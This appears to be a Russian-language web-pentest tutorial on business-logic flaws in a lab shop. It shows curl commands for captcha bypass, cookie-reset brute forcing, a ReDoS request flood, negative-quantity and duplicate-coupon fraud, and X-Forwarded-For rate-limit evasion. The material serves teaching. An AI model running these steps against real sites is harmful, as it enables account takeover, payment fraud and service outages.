## Задача

**Бизнес-логика** — это правила самого приложения: «капча обязательна», «цена берётся с сервера», «код действует один раз». Такие баги не ловит ни один сканер: код работает «как написано», просто написанное можно обойти. В этой ступени — два базовых абьюза: обход капчи и злоупотребление дорогими вычислениями.

Разберём оба на магазине.

## Наш пример: регистрация с капчей

На странице регистрации есть капча. Посмотрим, как сервер её проверяет:

```bash
$ curl -s https://shop.local/captcha/new
{"captcha_id":"c7f1","image":"/captcha/c7f1.png"}

$ curl -s -d 'captcha_id=c7f1&captcha=ABCD&user=alice&pass=x' https://shop.local/register
{"error":"wrong_captcha"}
```

Капча есть. Теперь проверим, действительно ли она одноразовая и привязана к сессии:

```bash
$ for i in 1 2 3; do curl -s -d 'captcha_id=c7f1&captcha=ABCD&user=alice&pass=x' https://shop.local/register; echo; done
{"error":"wrong_captcha"}
{"error":"wrong_captcha"}
{"error":"wrong_captcha"}
```

Один и тот же `captcha_id` не «сгорает» — значит, его можно переиспользовать. Если бы мы знали правильный код, капча защищала бы только один запрос. Но хуже другое: проверим, что если капчу не отправлять вовсе.

## Шаг 1: обход через отсутствие параметра

Классическая ошибка: проверка капчи делается только «если параметр присутствует»:

```bash
$ curl -s -d 'user=bob&pass=x' https://shop.local/register
{"status":"ok","user":42}
```

Мы зарегистрировались **без капчи вообще**. Сервер проверяет капчу только когда поле пришло. Это логический баг: защита есть, но её можно не вызывать.

> **Логический баг** — код делает то, что задумано, но задуманное правило можно обойти нестандартным вводом (пропустить шаг, подставить значение, повторить действие).

## Шаг 2: обход через подмену ответа

Другой вариант: капчу проверяет **клиент**. Посмотрим на JS регистрации:

```javascript
if (captchaAnswer === 'ABCD') { form.submit(); }
```

Если проверка только на клиенте, сервер её не повторяет — достаточно отправить форму напрямую (curl), как мы сделали выше. Правило: **любая проверка, которая есть только в браузере, не считается защитой.**

## Шаг 3: капча на счётчике — обход через сброс

Иногда капча включается после N неудач, а счётчик живёт в cookie:

```bash
$ curl -s -d 'user=admin&pass=wrong' https://shop.local/login -c c.txt
{"error":"bad_credentials","attempts":1}
```

Если счётчик хранится в cookie, его сбрасывают, не отправляя её:

```bash
$ curl -s -d 'user=admin&pass=wrong' https://shop.local/login
{"error":"bad_credentials","attempts":1}
```

`attempts` снова 1 — капча никогда не включится. Перебор пароля идёт без ограничений.

## Шаг 4: дорогие вычисления — ReDoS и DoS

Логический абьюз не всегда про доступ. Если приложение делает **тяжёлую работу** по нашему запросу, его можно «положить» дёшево. Пример — уязвимое регулярное выражение:

```bash
$ time curl -s 'https://shop.local/validate?email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'
real 0m8.9s
```

Строка из 44 `a` и `!` заставила regex уйти в катастрофический бэктрекинг. Это **ReDoS** (regular expression denial of service). Отправляя несколько таких запросов, мы занимаем все воркеры сервера.

```bash
$ for i in $(seq 20); do curl -s 'https://shop.local/validate?email=aaaa...!' & done
# сервер перестаёт отвечать
```

## Шаг 5: как искать логические абьюзы

- **Пропуск шага:** не отправляй поле/запрос, который «обязателен» (капча, подтверждение, шаг мастера).
- **Повтор:** отправь один и тот же одноразовый код дважды; проверь, «сгорает» ли он.
- **Клиентская проверка:** ищи правила в JS — если проверка только там, обойди её.
- **Тяжёлые операции:** замеряй время ответа на длинных/повторяющихся вводах.
- **Счётчики в cookie/клиенте:** сбрасывай cookie и наблюдай, сохраняется ли лимит.

## Если не сработало

- **Капча на сервере и одноразовая** — ищи другие абьюзы: OCR, аудио-капча, повтор id с другим сеансом.
- **ReDoS нет** — поищи другие дорогие операции: сложные сортировки, генерация PDF, загрузка больших файлов.
- **Есть rate-limit** — проверь, считается ли он по IP (меняй `X-Forwarded-For`) или по аккаунту.
- **Всё строго** — переходи к гонкам (`web-logic-races`).

## Что мы теперь знаем

- Логические баги не ловятся сканерами: код «правильный», но правило обходится.
- Капча обходится через отсутствие параметра, клиентскую проверку или сброс счётчика.
- Тяжёлые вычисления (ReDoS) позволяют «положить» сервер дёшево.
- Ключевой вопрос: «что будет, если я пропущу шаг или повторю действие?»

## Частые вопросы

**Почему логические баги не ловятся сканерами?** Потому что код «работает как задумано»: нет небезопасной функции, нет сигнатуры. Сканер ищет шаблоны, а тут нужно **понимать смысл**.

**Как развить «чутьё» на логические баги?** Постоянно спрашивай: «что если я пропущу шаг, повторю действие, пришлю неожиданное значение?». Это и есть метод.

**Капча — это защита или формальность?** Как защита — только если она на сервере, одноразовая и привязана к сессии. Иначе это формальность, которую обходят.

**ReDoS можно эксплуатировать случайно?** Да, но для пентеста важнее доказать **воспроизводимость**: одна строка → долгая задержка. Не устраивай реальный DoS без согласования.

**Где искать дорогие операции?** Генерация PDF, ресайз картинок, сложные regex, сортировки больших списков, крипто-операции — всё, что делает сервер по твоему запросу.

**Что писать в отчёте по логике?** Конкретный эффект: бесплатный товар, обход лимита, отказ в обслуживании. С шагами воспроизведения.

## Ещё один сценарий: бесплатный товар через отрицательное количество

Логика часто ломается на «невозможных» значениях. Добавим товар с отрицательным количеством:

```bash
$ curl -s -b c.txt -d 'item=42&qty=-5' https://shop.local/cart/add
{"status":"ok","cart_total":-9950}
```

Итог стал отрицательным. Добавим дорогой товар:

```bash
$ curl -s -b c.txt -d 'item=99&qty=1' https://shop.local/cart/add
{"status":"ok","cart_total":100}
```

Оформляем заказ — магазин «должен» нам деньги. Классический логический абьюз: сервер не проверил, что количество положительное.

```bash
$ curl -s -b c.txt -d 'coupon=SAVE10&coupon=SAVE10' https://shop.local/cart/coupon
{"status":"ok","discount":20}
```

Дублирование купона тоже часто не проверяется.

## На что смотреть дальше

- **Границы значений.** Отрицательные, нулевые, огромные, дробные.
- **Пропуск шага.** Не отправляй обязательное поле/запрос.
- **Повтор.** Одноразовый код/купон — отправь дважды.
- **Клиентская проверка.** Ищи правила в JS и обходи их напрямую.
- **Тяжёлые операции.** Замеряй время на длинных вводах (ReDoS).
- **Счётчики.** Хранятся в cookie? Сбрось и проверь лимит.

## Куда дальше
